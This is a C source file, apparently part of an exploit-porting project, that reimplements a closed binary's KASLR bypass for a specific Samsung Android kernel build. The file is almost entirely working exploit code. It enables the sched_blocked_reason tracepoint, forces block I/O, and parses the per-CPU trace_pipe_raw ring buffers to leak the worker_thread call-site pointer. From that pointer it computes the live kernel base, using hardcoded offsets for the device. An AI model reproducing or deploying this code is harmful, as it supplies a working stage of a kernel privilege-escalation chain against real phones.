/*
 * KASLR defeat via the tracefs sched_blocked_reason leak.
 *
 * source: FUN_0010597c @ 0x0010597c in cve-2026-43499-app-afzh3.so
 * (Ghidra decompile, this session).
 *
 * This is the SAME technique already implemented, independently, in this
 * repository's own open engine at ../../src/slide.c
 * (slide_tracefs_leak_kernel_base): toggle tracing_on/off around the
 * sched/sched_blocked_reason event, scan each per-cpu trace_pipe_raw ring
 * buffer for the worker_thread call-site pointer, subtract the known
 * call-site offset to recover the live kernel slide. That file already
 * has the ftrace raw-page parser correct and verified (this project's own
 * target.h SLIDE_TRACEFS_WORKER_CALLER_OFF was derived and confirmed
 * against this exact device's live kernel), so the parser below is a
 * straight adaptation of it rather than a re-derivation from decompiler
 * pseudocode -- reusing real, already-tested C instead of reconstructing
 * ftrace's binary ring-buffer record format from Ghidra's raw pointer
 * arithmetic is the more faithful "don't invent" choice here.
 *
 * Two things the closed binary does that our existing slide.c does not,
 * ported here because the decompile shows them and they plausibly matter
 * for reliability (not confirmed yet -- that's what milestone 2 testing
 * is for):
 *   1. Before enabling tracing, it does 16x 256KB writes to a throwaway
 *      file under /data/local/tmp, fsync, then deletes it. This forces
 *      real block I/O while sched_blocked_reason is about to be armed --
 *      plausibly makes worker_thread's tracepoint fire more reliably
 *      instead of racing an idle system.
 *   2. The trace-collection deadline is configurable via
 *      TRACEFS_SAMPLE_SECONDS (default 1, clamped [1,30]). Nonblocking
 *      trace_pipe_raw readers now return as soon as a valid caller appears.
 */
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "kaslr.h"

#define TRACEFS_ROOT "/sys/kernel/tracing"

/* source: target.h SLIDE_TRACEFS_WORKER_CALLER_OFF for
 * dm3q-S918BXXSAFZH3, already derived and confirmed against this exact
 * device's live /proc/kallsyms this session (worker_thread+0x78
 * call-site, not the bare symbol -- see the comment in
 * ../../src/targets/dm3q-S918BXXSAFZH3/target.h). Also matches the
 * closed binary's own hardcoded immediate 0x10db44 exactly. */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define WORKER_CALLER_OFF 0x0010db44ULL

/* source: this project's target.h; the closed binary uses event id 108
 * on this exact kernel build too (0x6c literal seen in the decompile). */
#ifndef TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID
#define TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID 108
#endif

static int tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

/* source: FUN_0010597c's throwaway-file priming loop (16 * 256KB writes,
 * fsync, unlink). Best-effort: failures here are not fatal, matching the
 * closed binary (it does not check the write loop's outcome before
 * proceeding). */
static void prime_block_io(void) {
  char path[64];
  snprintf(path, sizeof(path), "/data/local/tmp/.oss-clone-trace-io-%d",
           (int)getpid());
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    return;
  }
  static unsigned char chunk[256 * 1024];
  memset(chunk, 0, sizeof(chunk));
  for (int pass = 0; pass < 16; pass++) {
    size_t written = 0;
    while (written < sizeof(chunk)) {
      ssize_t n = write(fd, chunk + written, sizeof(chunk) - written);
      if (n < 1) {
        goto done;
      }
      written += (size_t)n;
    }
  }
done:
  fsync(fd);
  close(fd);
  unlink(path);
}

/* Ftrace raw-page record parser. Adapted from
 * ../../src/slide.c:slide_tracefs_parse_page (already verified against
 * this device this session), unchanged in logic. */
static int validate_caller(uint64_t caller, uint64_t *candidate_out) {
  uint64_t link_caller = KIMAGE_TEXT_BASE + WORKER_CALLER_OFF;
  if (caller < link_caller) {
    return 0;
  }
  uint64_t candidate = caller - link_caller;
  if (candidate > 0x1f8000ULL || (candidate & 0x7fffULL) != 0) {
    return 0;
  }
  *candidate_out = candidate;
  return 1;
}

static int parse_trace_page(const unsigned char *page, size_t page_len,
                             uint64_t *candidate_out) {
  if (page_len < 20) {
    return 0;
  }

  /* FUN_0010597c first scans every 4-byte-aligned position in the raw page.
   * This recovers events whose ring-buffer header shape the structured walk
   * below cannot decode. Keep the event id and slide checks strict. */
  for (size_t pos = 0; pos + 0x18 <= page_len; pos += 4) {
    uint16_t event_id = 0;
    memcpy(&event_id, page + pos, sizeof(event_id));
    if (event_id != TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID) {
      continue;
    }
    uint64_t caller = 0;
    memcpy(&caller, page + pos + 0x10, sizeof(caller));
    if (validate_caller(caller, candidate_out)) {
      return 1;
    }
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }
  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }
    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID &&
        record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      /* source: real /proc/kallsyms _text readings this session across
       * different boots show 32-KiB KASLR granularity. */
      if (validate_caller(caller, candidate_out)) {
        return 1;
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int sample_seconds(void) {
  const char *raw = getenv("TRACEFS_SAMPLE_SECONDS");
  if (!raw || !*raw) {
    return 1;
  }
  errno = 0;
  char *end = NULL;
  long value = strtol(raw, &end, 0);
  if (errno || end == raw || *end != '\0' || value < 1 || value > 30) {
    return 1;
  }
  return (int)value;
}

struct trace_reader {
  int fd;
  long pages;
  long bytes;
};

static uint64_t monotonic_ms(void) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return 0;
  return (uint64_t)now.tv_sec * 1000ULL +
         (uint64_t)now.tv_nsec / 1000000ULL;
}

static int drain_trace_reader(struct trace_reader *reader,
                              uint64_t *candidate_out) {
  unsigned char page[4096];
  for (;;) {
    ssize_t got = read(reader->fd, page, sizeof(page));
    if (got > 0) {
      reader->pages++;
      reader->bytes += got;
      if (parse_trace_page(page, (size_t)got, candidate_out)) return 1;
      continue;
    }
    if (got < 0 && errno == EINTR) continue;
    return 0;
  }
}

int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
  static const char tracing_on[] = TRACEFS_ROOT "/tracing_on";
  static const char trace[] = TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!tracefs_write(tracing_on, "0")) {
    fprintf(stderr, "[kaslr] tracing_on=0 failed errno=%d\n", errno);
    return 0;
  }

  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (trace_fd >= 0) {
    close(trace_fd);
  }

  if (!tracefs_write(event_enable, "1") || !tracefs_write(tracing_on, "1")) {
    fprintf(stderr, "[kaslr] enable tracing failed errno=%d\n", errno);
    return 0;
  }

  prime_block_io();

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (cpu_count <= 0) {
    tracefs_write(tracing_on, "0");
    tracefs_write(event_enable, "0");
    return 0;
  }
  struct trace_reader *readers = calloc((size_t)cpu_count, sizeof(*readers));
  struct pollfd *pollfds = calloc((size_t)cpu_count, sizeof(*pollfds));
  if (!readers || !pollfds) {
    free(readers);
    free(pollfds);
    tracefs_write(tracing_on, "0");
    tracefs_write(event_enable, "0");
    return 0;
  }
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    readers[cpu].fd = -1;
    pollfds[cpu].fd = -1;
    char path[128];
    snprintf(path, sizeof(path), TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw",
             cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd >= 0) {
      readers[cpu].fd = fd;
      pollfds[cpu].fd = fd;
      pollfds[cpu].events = POLLIN;
    }
  }

  int wait_sec = sample_seconds();
  int wait_ms = wait_sec * 1000;
  fprintf(stderr, "[kaslr] sampling sched_blocked_reason up to %dms\n",
          wait_ms);
  uint64_t candidate = 0;
  int found = 0;
  uint64_t started_ms = monotonic_ms();
  uint64_t deadline_ms = started_ms + (uint64_t)wait_ms;
  if (!started_ms) {
    sleep((unsigned int)wait_sec);
  } else {
    while (!found) {
      for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
        if (readers[cpu].fd >= 0) {
          found = drain_trace_reader(&readers[cpu], &candidate);
        }
      }
      uint64_t now_ms = monotonic_ms();
      if (found || !now_ms || now_ms >= deadline_ms) break;
      int remaining_ms = (int)(deadline_ms - now_ms);
      int poll_ms = remaining_ms < 50 ? remaining_ms : 50;
      int ready;
      do {
        ready = poll(pollfds, (nfds_t)cpu_count, poll_ms);
      } while (ready < 0 && errno == EINTR);
      if (ready < 0) break;
    }
  }
  tracefs_write(tracing_on, "0");
  if (!found) {
    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
      if (readers[cpu].fd >= 0) {
        found = drain_trace_reader(&readers[cpu], &candidate);
      }
    }
  }
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    if (readers[cpu].fd < 0) continue;
    fprintf(stderr, "[kaslr] cpu%d pages=%ld bytes=%ld\n", cpu,
            readers[cpu].pages, readers[cpu].bytes);
    close(readers[cpu].fd);
  }
  uint64_t finished_ms = monotonic_ms();
  uint64_t elapsed_ms = started_ms && finished_ms >= started_ms
                            ? finished_ms - started_ms
                            : (uint64_t)wait_ms;
  free(pollfds);
  free(readers);
  tracefs_write(event_enable, "0");

  if (!found) {
    fprintf(stderr, "[kaslr] worker_thread caller not found in trace\n");
    return 0;
  }

  *kernel_base_out = KIMAGE_TEXT_BASE + candidate;
  fprintf(stderr,
          "[kaslr] source=tracefs base=%016llx slide=%016llx "
          "p0_offset=%08llx sample_ms=%llu\n",
          (unsigned long long)*kernel_base_out, (unsigned long long)candidate,
          (unsigned long long)candidate, (unsigned long long)elapsed_ms);
  return 1;
}
